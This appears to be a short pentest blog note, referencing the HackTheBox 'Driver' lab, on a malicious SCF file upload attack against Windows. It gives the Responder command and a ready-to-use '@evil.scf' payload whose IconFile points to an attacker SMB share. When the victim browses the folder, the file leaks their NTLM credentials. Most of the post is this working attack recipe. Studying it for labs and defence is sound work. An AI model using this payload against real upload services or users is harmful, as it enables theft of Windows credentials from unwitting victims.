---
layout: post
title: Malicious SCF File Upload
description:  Malicious SCF File Upload
summary:  Malicious SCF File Upload
tags: [windows,rce,foothold,smb]
minute: 1
---
## Overview
Attacker can upload a maliciuous SCF file that will connect to attacker SMB share once victim accessed it.

One example to access SCF file is via `explorer.exe`.

```
%SystemRoot%\explorer.exe "C:\Users\victim\desktop"
```

## Environment Setup
* Webapp that allows file upload
* Some background script inside victim that access the uploaded files

## Steps
* Open responder on attacker machine

```bash
sudo responder -I tun0
```

* Create a malicious SCF file and name it as `@evil.scf`. Put the path to attacker share.

```
[Shell]
Command=2
IconFile=\\10.10.14.13\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

* Upload the file and wait for someone to access
* You should be able to intercept NTLM creds

## Reference
* HTB Driver
* [SMB Share – SCF File Attacks – Penetration Testing Lab](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
